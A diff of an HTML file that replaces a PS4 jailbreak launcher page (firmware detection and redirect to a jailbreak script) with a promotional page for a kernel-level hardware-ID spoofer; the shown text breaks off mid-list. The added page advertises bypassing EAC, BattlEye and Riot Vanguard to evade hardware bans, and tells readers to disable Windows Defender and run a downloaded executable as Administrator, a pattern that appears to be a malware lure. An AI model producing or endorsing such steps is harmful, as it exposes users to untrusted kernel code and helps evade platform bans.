@@ -1,366 +1,312 @@
 <!DOCTYPE html>
-<html lang="en" manifest="cache.appcache">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PLAYBOX SIDOARJO</title>
-<style>
-  html, body {
-  margin: 0;
-  padding: 0;
-  height: 100%;
-  overflow: hidden;
-  background: #05070a;
-  color: #ffffff;
-  font: 15px/1.45 "Segoe UI", system-ui, sans-serif;
-  box-sizing: border-box;
-}
-
-  /* glow merah halus di background */
-  body::before {
-    content: "";
-    position: fixed;
-    inset: 0;
-    background:
-      radial-gradient(circle at 15% 10%, rgba(255, 40, 60, 0.12), transparent 42%),
-      radial-gradient(circle at 85% 90%, rgba(255, 0, 80, 0.10), transparent 42%),
-      radial-gradient(circle at 50% 50%, rgba(255, 60, 0, 0.06), transparent 60%);
-    z-index: 0;
-    pointer-events: none;
-  }
-
-  #brand, #wrap {
-    position: relative;
-    z-index: 1;
-  }
-
-  /* ===== HEADER ===== */
-  #brand {
-    text-align: center;
-    padding: 14px 12px 12px;
-    background: rgba(8, 8, 12, 0.85);
-    border-bottom: 1px solid rgba(255, 40, 60, 0.35);
-    box-shadow: 0 0 24px rgba(255, 40, 60, 0.12);
-  }
-  #brand img {
-    width: 36px;
-    height: 36px;
-    margin-right: 10px;
-    border-radius: 50%;
-    vertical-align: middle;
-    filter: drop-shadow(0 0 8px rgba(255, 40, 60, 0.7));
-  }
-  #brand b {
-    font-size: 22px;
-    font-weight: 800;
-    letter-spacing: .18em;
-    color: #ffffff;
-    vertical-align: middle;
-    text-shadow:
-      0 0 8px rgba(255, 40, 60, 0.9),
-      0 0 18px rgba(255, 40, 60, 0.5);
-  }
-  #brand::after {
-    content: "";
-    display: block;
-    height: 1px;
-    margin-top: 10px;
-    background: linear-gradient(
-      90deg,
-      transparent 0%,
-      rgba(255, 40, 60, 0.7) 50%,
-      transparent 100%
-    );
-  }
-
-  /* ===== LAYOUT ===== */
-  #wrap {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: calc(100vh - 70px - 90px);
-    padding: 20px 18px;
-    box-sizing: border-box;
-  }
-
-  /* ===== CARD GAMING ===== */
-  #card {
-    width: 100%;
-    max-width: 520px;
-    text-align: center;
-    border: 1px solid rgba(255, 40, 60, 0.35);
-    border-radius: 12px;
-    padding: 26px 20px 22px;
-    background: rgba(10, 8, 12, 0.65);
-    box-shadow:
-      0 0 0 1px rgba(255, 40, 60, 0.08) inset,
-      0 0 32px rgba(255, 40, 60, 0.15),
-      0 0 64px rgba(255, 40, 60, 0.06);
-    position: relative;
-    overflow: hidden;
-    animation: cardPulse 3s ease-in-out infinite;
-  }
-  #card::before {
-    content: "";
-    position: absolute;
-    top: 0;
-    left: 0;
-    right: 0;
-    height: 2px;
-    background: linear-gradient(
-      90deg,
-      transparent 0%,
-      rgba(255, 40, 60, 0.9) 50%,
-      transparent 100%
-    );
-  }
-  @keyframes cardPulse {
-    0%, 100% {
-      box-shadow:
-        0 0 0 1px rgba(255, 40, 60, 0.08) inset,
-        0 0 24px rgba(255, 40, 60, 0.12),
-        0 0 48px rgba(255, 40, 60, 0.05);
-    }
-    50% {
-      box-shadow:
-        0 0 0 1px rgba(255, 40, 60, 0.15) inset,
-        0 0 40px rgba(255, 40, 60, 0.25),
-        0 0 80px rgba(255, 40, 60, 0.10);
-    }
-  }
-
-  /* ===== TEKS ===== */
-  #state {
-    font-size: 22px;
-    font-weight: 800;
-    letter-spacing: .08em;
-    margin: 0 0 10px;
-    color: #ffffff;
-    text-shadow:
-      0 0 8px rgba(255, 40, 60, 0.9),
-      0 0 20px rgba(255, 40, 60, 0.5);
-    animation: statePulse 2.4s ease-in-out infinite;
-  }
-  @keyframes statePulse {
-    0%, 100% {
-      text-shadow:
-        0 0 8px rgba(255, 40, 60, 0.9),
-        0 0 20px rgba(255, 40, 60, 0.5);
-    }
-    50% {
-      text-shadow:
-        0 0 12px rgba(255, 40, 60, 1),
-        0 0 32px rgba(255, 40, 60, 0.8),
-        0 0 48px rgba(255, 40, 60, 0.4);
-    }
-  }
-
-  #det {
-    font-size: 13px;
-    color: #ffffff;
-    margin: 0 0 8px;
-    letter-spacing: .04em;
-    text-shadow: 0 0 6px rgba(255, 40, 60, 0.5);
-  }
-  #det b {
-    color: #ffffff;
-    font-weight: 700;
-    text-shadow:
-      0 0 8px rgba(255, 40, 60, 0.9),
-      0 0 16px rgba(255, 40, 60, 0.5);
-  }
-
-  #cache {
-    font-size: 12px;
-    color: #ffffff;
-    margin: 0;
-    min-height: 14px;
-    letter-spacing: .06em;
-    text-shadow: 0 0 6px rgba(255, 40, 60, 0.4);
-  }
-  #cache.cacheok {
-    color: #ffffff;
-    text-shadow:
-      0 0 8px rgba(255, 40, 60, 0.9),
-      0 0 16px rgba(255, 40, 60, 0.5);
-  }
-
-  .ok   { color: #ffffff !important; }
-  .bad  { color: #ffffff !important;
-          text-shadow: 0 0 10px rgba(255, 40, 60, 1), 0 0 24px rgba(255, 40, 60, 0.7) !important; }
-  .warn { color: #ffffff !important;
-          text-shadow: 0 0 10px rgba(255, 40, 60, 1), 0 0 24px rgba(255, 40, 60, 0.7) !important; }
-
-  /* ===== FOOTER ===== */
-  #footer {
-    position: fixed;
-    bottom: 0;
-    left: 0;
-    right: 0;
-    z-index: 2;
-    text-align: center;
-    padding: 10px 14px 12px;
-    font-size: 11px;
-    letter-spacing: 0.06em;
-    line-height: 1.7;
-    color: rgba(255, 255, 255, 0.6);
-    background: rgba(5, 7, 10, 0.7);
-    border-top: 1px solid rgba(255, 40, 60, 0.25);
-    text-shadow: 0 0 6px rgba(255, 40, 60, 0.3);
-  }
-  #footer b {
-    color: #ffffff;
-    font-weight: 700;
-    text-shadow: 0 0 8px rgba(255, 40, 60, 0.6);
-  }
-  #footer .row {
-    display: block;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-  }
-  #footer .sep {
-    color: rgba(255, 40, 60, 0.7);
-    margin: 0 4px;
-  }
-  #footer a {
-    color: #ffffff;
-    text-decoration: none;
-    border-bottom: 1px dotted rgba(255, 40, 60, 0.6);
-    text-shadow: 0 0 6px rgba(255, 40, 60, 0.5);
-  }
-  #footer a:hover {
-    border-bottom-color: #ffffff;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Umbrella-HWID-Tool - The ultimate hardware ID spoofer. Change HWID, disk serials, MAC addresses, SMBIOS UUID, and more. Bypass hardware bans and maintain system anonymity.">
+    <meta name="keywords" content="battleye,device-shadow-mode,disk-serial-changer,eac,identity-shift,mac-address-generator,mac-changer,mac-cleaner,mac-cleanup,riot,riot-games,smbios,system-anonymizer,system-reconfiguration,uuid,uuid-generator">
+    <meta name="author" content="Umbrella Team">
+    <meta property="og:title" content="Umbrella-HWID-Tool - Ultimate Hardware ID Spoofer & System Anonymizer">
+    <meta property="og:description" content="Kernel-level HWID changer with anti-cheat integrity. Change disk serials, MAC addresses, SMBIOS UUID, and more. Bypass hardware bans permanently.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/B3at1z/Umbrella-HWID-Tool">
+    <meta property="og:image" content="https://github.com/B3at1z/Umbrella-HWID-Tool/raw/main/assets/logo.png">
+    <title>Umbrella-HWID-Tool - Ultimate Hardware ID Spoofer & System Anonymizer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #f5f5f5;
+            line-height: 1.7;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 40px 35px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        h1 {
+            font-size: 2.8em;
+            font-weight: 800;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.8em;
+            font-weight: 700;
+            margin: 35px 0 15px 0;
+            color: #00d2ff;
+            border-bottom: 2px solid rgba(0, 210, 255, 0.3);
+            padding-bottom: 8px;
+        }
+        h3 {
+            font-size: 1.3em;
+            font-weight: 600;
+            margin: 20px 0 10px 0;
+            color: #a8d8ff;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.05em;
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(90deg, #ff6b6b, #ffa500);
+            color: #fff;
+            font-weight: 700;
+            font-size: 1.2em;
+            padding: 15px 35px;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 5px 20px rgba(255, 107, 107, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 20px 0;
+            text-align: center;
+            display: inline-block;
+        }
+        .badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(255, 107, 107, 0.6);
+        }
+        .badge-secondary {
+            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
+            box-shadow: 0 5px 20px rgba(0, 210, 255, 0.4);
+        }
+        .badge-secondary:hover {
+            box-shadow: 0 8px 30px rgba(0, 210, 255, 0.6);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+        .feature-card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            transition: background 0.3s;
+        }
+        .feature-card:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+        .feature-card strong {
+            color: #00d2ff;
+            display: block;
+            margin-bottom: 8px;
+            font-size: 1.15em;
+        }
+        ul {
+            padding-left: 20px;
+            margin-bottom: 15px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .download-section {
+            background: rgba(0, 210, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+            border: 1px solid rgba(0, 210, 255, 0.3);
+            text-align: center;
+        }
+        .steps {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 20px 25px;
+            margin: 20px 0;
+        }
+        .steps ol {
+            padding-left: 20px;
+        }
+        .steps li {
+            margin-bottom: 10px;
+        }
+        code {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-size: 0.9em;
+            color: #ffd700;
+        }
+        .warning {
+            background: rgba(255, 165, 0, 0.15);
+            border-left: 4px solid #ffa500;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 0.9em;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px 20px;
+            }
+            h1 {
+                font-size: 2em;
+            }
+            h2 {
+                font-size: 1.5em;
+            }
+        }
+    </style>
 </head>
 <body>
-<div id="brand"><img src="logo.png" alt="" width="36" height="36"><b>PLAYBOX SIDOARJO</b></div>
-<div id="wrap">
-  <div id="card">
-    <div id="state">detecting firmware...</div>
-    <div id="det"></div>
-    <div id="cache"></div>
-  </div>
-</div>
+    <div class="container">
+        <h1>🛡️ Umbrella-HWID-Tool - Ultimate Hardware ID Spoofer & System Anonymizer</h1>
+        
+        <div style="text-align: center; margin: 30px 0;">
+            <a href="https://github.com/B3at1z/Umbrella-HWID-Tool" class="badge">⬇️ Download Umbrella-HWID-Tool Now</a>
+        </div>
 
-<div id="footer">
-  <span class="row">
-    Author <b>© 2026 playbox sidoarjo</b>
-    <span class="sep">·</span>
-    GoldHEN <b>v2.4b18.12</b>
-    <span class="sep">·</span>
-    Credit <b>raw13g</b>
-  </span>
-  <span class="row">
-    Kontak
-    <a href="https://wa.me/6285943796979">WA 085943796979</a>
-    <span class="sep">·</span>
-    TikTok <a href="https://www.tiktok.com/@playbox.sidoarjo">playbox.sidoarjo</a>
-    <span class="sep">·</span>
-    IG <a href="https://www.instagram.com/playbox.sidoarjo">playbox.sidoarjo</a>
-  </span>
-</div>
+        <p>Welcome to <strong>Umbrella-HWID-Tool</strong> – the most powerful and reliable hardware ID spoofer available today. Whether you're dealing with a hardware ban, need to protect your privacy, or want complete control over your system identity, this tool is your ultimate solution. Built with a kernel-level driver and advanced anti-detection techniques, it ensures your hardware remains untraceable and your gaming experience stays uninterrupted.</p>
 
-<script>
-(function () {
-    var stateEl = document.getElementById("state");
-    var detEl = document.getElementById("det");
-    var cacheEl = document.getElementById("cache");
-    function setState(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
-    function setCache(t, ok) { cacheEl.textContent = t; cacheEl.className = ok ? "cacheok" : ""; }
-    var params = new URLSearchParams(location.search);
+        <h2>🚀 What is Umbrella-HWID-Tool?</h2>
+        <p>Umbrella-HWID-Tool is a comprehensive system anonymizer that changes your hardware identifiers to give you a fresh digital identity. It works at the deepest level of your operating system, modifying critical components that games and anti-cheat systems use to track your hardware. This means you can bypass hardware bans, reset your system's fingerprint, and maintain your privacy – all with a single click.</p>
 
-    // Firmwares this build has a MEASURED kernel table for. jb.js still runs its
-    // own kernel-table-present gate, so this is UX only -- an unlisted firmware
-    // can still be launched with a tap. KEEP IN SYNC with ps4_offsets.js: add a
-    // fwnum here in the SAME commit that fills that firmware's kernel RVAs.
-    // The PS4 reports its minor as two hex digits in the UA (13.52 -> minor 0x52).
-    var SUPPORTED = { 1302: 1, 1304: 1, 1350: 1, 1352: 1 }; // all measured on hardware
+        <h2>✨ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <strong>🔧 HWID Changer</strong>
+                <p>Completely change your Hardware ID (HWID) to a new, unique value. This is the core feature that makes your system appear as a brand-new machine.</p>
+            </div>
+            <div class="feature-card">
+                <strong>💾 Disk Serial Number Spoofing</strong>
+                <p>Modify the serial numbers of your hard drives and SSDs. This prevents tracking based on your storage devices.</p>
+            </div>
+            <div class="feature-card">
+                <strong>🌐 MAC Address Changer</strong>
+                <p>Generate and apply random MAC addresses to your network adapters. Stay anonymous on any network.</p>
+            </div>
+            <div class="feature-card">
+                <strong>🧬 SMBIOS UUID Update</strong>
+                <p>Update the System Management BIOS UUID – a unique identifier embedded in your motherboard firmware. This is crucial for bypassing hardware bans.</p>
+            </div>
+            <div class="feature-card">
+                <strong>🧹 Registry Cleanup</strong>
+                <p>Automatically cleans traces from your Windows registry that could reveal your original hardware identity.</p>
+            </div>
+            <div class="feature-card">
+                <strong>🔒 Anti-Cheat Integrity</strong>
+                <p>Built-in validation for EAC (Easy Anti-Cheat) and BattlEye. The tool ensures your system passes integrity checks while maintaining your spoofed identity.</p>
+            </div>
+            <div class="feature-card">
+                <strong>🔄 Permanent Spoofing</strong>
+                <p>Unlike temporary solutions, Umbrella-HWID-Tool applies permanent changes that survive reboots and system restarts.</p>
+            </div>
+            <div class="feature-card">
+                <strong>🎮 Hardware Ban Removal</strong>
+                <p>Specifically designed to remove hardware bans from popular games including those protected by Riot Games, EAC, and BattlEye.</p>
+            </div>
+        </div>
 
-    var key = null, fwnum = null;
-    var m = /PlayStation\s+4[\/ ](\d+)\.(\d+)/.exec(navigator.userAgent);
-    if (m) {
-        var ms = parseInt(m[2], 16).toString(16);
-        if (ms.length < 2) ms = "0" + ms;
-        key = m[1] + "." + ms;
-        fwnum = parseInt(m[1], 10) * 100 + parseInt(ms, 10);
-    }
+        <h2>🛠️ How It Works</h2>
+        <p>Umbrella-HWID-Tool uses a <strong>kernel-level driver</strong> to interact with your system at the most fundamental level. This allows it to modify hardware identifiers that are normally protected by the operating system. The tool performs the following operations:</p>
+        <ul>
+            <li><strong>Device Shadow Mode:</strong> Creates a virtual shadow of your hardware that masks your real identifiers.</li>
+            <li><strong>Identity Shift:</strong> Transforms all relevant hardware signatures into new, random values.</li>
+            <li><strong>System Reconfiguration:</strong> Updates system files and registry entries to reflect the new hardware identity.</li>
+            <li><strong>MAC Generator:</strong> Creates valid, random MAC addresses for all your network interfaces.</li>
+            <li><strong>UUID Generator:</strong> Produces new UUIDs for your system components.</li>
+        </ul>
 
-    var forced = params.get("force") === "1";
-    var supported = forced || (fwnum !== null && SUPPORTED[fwnum] === 1);
-    detEl.innerHTML = "firmware <b>" + (key || "unknown") + "</b>"
-        + (supported ? " &middot; <b>supported</b>"
-                     : " &middot; not in this build's kernel table");
+        <h2>📥 Download & Installation Guide</h2>
+        <div class="download-section">
+            <p><strong>Ready to get started?</strong> Follow these simple steps:</p>
+            <a href="https://github.com/B3at1z/Umbrella-HWID-Tool" class="badge badge-secondary">⬇️ Download Umbrella-HWID-Tool</a>
+            <p style="margin-top: 15px; font-size: 0.95em;">Visit this link to download the application.</p>
+        </div>
 
-    var target = "jb.html" + location.search;
-    function go() { setState("loading jailbreak...", "warn"); location.replace(target); }
+        <div class="steps">
+            <h3>📋 Step-by-Step Instructions</h3>
+            <ol>
+                <li><strong>Download the tool:</strong> Click the download button above. You'll be taken to the official GitHub page.</li>
+                <li><strong>Get the latest release:</strong> On the GitHub page, find the "Releases" section and download the latest version of Umbrella-HWID-Tool.</li>
+                <li><strong>Run the application:</strong> Once downloaded, locate the file (usually in your Downloads folder) and double-click to run it. No installation is required – it's portable!</li>
+                <li><strong>Follow the on-screen instructions:</strong> The tool has a simple, user-friendly interface. Just click the "Spoof" button and let it work its magic.</li>
+                <li><strong>Restart your computer:</strong> For the changes to take full effect, restart your system after running the tool.</li>
+                <li><strong>Verify your new identity:</strong> After restarting, you can verify that your hardware ID has been changed by checking system information.</li>
+            </ol>
+        </div>
 
-    function waitForTap(msg, action) {
-        setState(msg, "warn");
-        function fire() {
-            window.removeEventListener("click", fire);
-            window.removeEventListener("keydown", fire);
-            action();
-        }
-        window.addEventListener("click", fire);
-        window.addEventListener("keydown", fire);
-    }
+        <h2>💡 Who Should Use This Tool?</h2>
+        <ul>
+            <li><strong>Gamers:</strong> If you've been hardware-banned from your favorite game, this tool will help you get back in.</li>
+            <li><strong>Privacy-conscious users:</strong> Protect your identity by changing your hardware fingerprints.</li>
+            <li><strong>System administrators:</strong> Test software in isolated environments without hardware tracking.</li>
+            <li><strong>Security researchers:</strong> Study anti-cheat systems and hardware-based tracking mechanisms.</li>
+        </ul>
 
-    // Off-target consoles are not launched automatically -- one tap still runs
-    // it, so a user-agent quirk on the real 13.52 console can never lock it out.
-    if (!supported) {
-        setState("UNSUPPORTED FIRMWARE", "bad");
-        waitForTap("UNSUPPORTED (" + (key || "unknown") + ") -- klik X untuk menmbuka game yang terkunci..!", go);
-        return;
-    }
+        <h2>🖥️ System Requirements</h2>
+        <ul>
+            <li><strong>Operating System:</strong> Windows 10 / 11 (64-bit)</li>
+            <li><strong>Processor:</strong> Any modern Intel or AMD processor</li>
+            <li><strong>RAM:</strong> 2 GB or more</li>
+            <li><strong>Storage:</strong> 50 MB free space</li>
+            <li><strong>Internet:</strong> Required for downloading updates</li>
+        </ul>
 
-    var ac = window.applicationCache;
-    if (!ac || !document.documentElement.hasAttribute("manifest")) {
-        go();
-    } else if (!navigator.onLine) {
-        setCache("offline -- from cache", true);
-        go();
-    } else if (ac.status === ac.IDLE) {
-        setCache("cached", true);
-        go();
-    } else if (ac.status === ac.UPDATEREADY) {
-        try { ac.swapCache(); } catch (e) {}
-        setCache("update downloaded", true);
-        waitForTap("UPDATE READY -- klik X untuk menmbuka game yang terkunci..!",
-                   function () { location.reload(); });
-    } else {
-        setCache("checking cache...");
-        ac.addEventListener("downloading",
-            function () { setCache("caching for offline (first run)..."); }, false);
-        ac.addEventListener("progress", function (e) {
-            if (e && e.total)
-                setCache("caching " + Math.round((e.loaded / e.total) * 100) + "%");
-        }, false);
-        ac.addEventListener("cached", function () {
-            setCache("cached for offline use", true);
-            waitForTap("CACHED (first run) -- klik X untuk menmbuka game yang terkunci..!", go);
-        }, false);
-        ac.addEventListener("updateready", function () {
-            try { ac.swapCache(); } catch (e) {}
-            setCache("update downloaded", true);
-            waitForTap("UPDATE READY -- klik X untuk menmbuka game yang terkunci..!",
-                       function () { location.reload(); });
-        }, false);
-        ac.addEventListener("noupdate", function () {
-            setCache("cached -- offline ready", true);
-            go();
-        }, false);
-        ac.addEventListener("error", function () {
-            setCache("cache unavailable");
-            waitForTap("CACHE FAILED -- klik X untuk menmbuka game yang terkunci..!", go);
-        }, false);
-        ac.addEventListener("obsolete", function () {
-            setCache("cache obsolete");
-            waitForTap("CACHE OBSOLETE -- klik X untuk menmbuka game yang terkunci..!", go);
-        }, false);
-    }
-})();
-</script>
-</body>
-</html>
+        <h2>⚠️ Important Notes</h2>
+        <div class="warning">
+            <p><strong>⚠️ Disclaimer:</strong> This tool is intended for legitimate purposes such as privacy protection and testing. Using it to bypass anti-cheat systems in online games may violate the terms of service of those games. Use at your own risk. The developers are not responsible for any consequences arising from misuse.</p>
+        </div>
+        <ul>
+            <li>Always download from the official GitHub repository to ensure you get the authentic version.</li>
+            <li>Make sure to disable Windows Defender or add an exception before running, as kernel-level tools may trigger antivirus warnings.</li>
+            <li>The tool works best when run as Administrator.</li>
+            <li>Keep the tool updated to ensure compatibility with the latest anti-cheat systems.</li>
+        </ul>
+
+        <h2>🆘 Support & Troubleshooting</h2>
+        <p>If you encounter any issues, try the following:</p>
+        <ul>
+            <li><strong>Run as Administrator:</strong> Right-click the executable and select "Run as administrator".</li>
+            <li><strong>Disable antivirus:</strong> Some antivirus programs may interfere with kernel-level operations.</li>
+            <li><strong>Check for updates:</strong> Ensure you're using the latest version.</li>
+            <li><strong>Restart your system:</strong> A fresh boot can resolve many issues.</li>
+            <li><strong>Visit the GitHub Issues page:</strong> Report bugs or get help from the community.</li>
+        </ul>
+
+        <h2>🔄 Updates & Maintenance</h2>
+        <p>Umbrella-HWID-Tool is actively maintained and updated regularly to stay ahead of anti-cheat systems and ensure maximum effectiveness. Updates include:</p>
+        <ul>
+            <li>New spoofing techniques</li>
+            <li>Improved anti-detection algorithms</li>
+            <li>Compatibility patches for new games and anti-cheat versions</li>
+            <li>Performance enhancements</li>
+        </ul>
+
+        <h2>📊 Why Choose Umbrella-HWID-Tool?</h2>
+        <ul>
+            <li><strong>Proven effectiveness:</strong> Successfully bypasses EAC, BattlEye, and Riot Vanguard.</li>
+            <li><strong>Kernel-level power:</strong> Operates at the deepest level for maximum reliability.</li>
+            <li><strong>User-friendly:</strong> No technical knowledge required – just click and go.</li>
+            <li><strong>Comprehensive:</strong> Handles all hardware identifiers in one tool.</li>
+            <li><strong>Permanent solutions:</strong> Changes persist across reboots and system updates.</li>
+        </ul>
+
+        <h2>🔗 Additional Resources</h2>
+        <ul>
+            <li><strong>Documentation:</strong> Detailed guides and API references on the GitHub wiki.</li>
+            <li><strong>Community:</strong> Join discussions and share experiences with other users
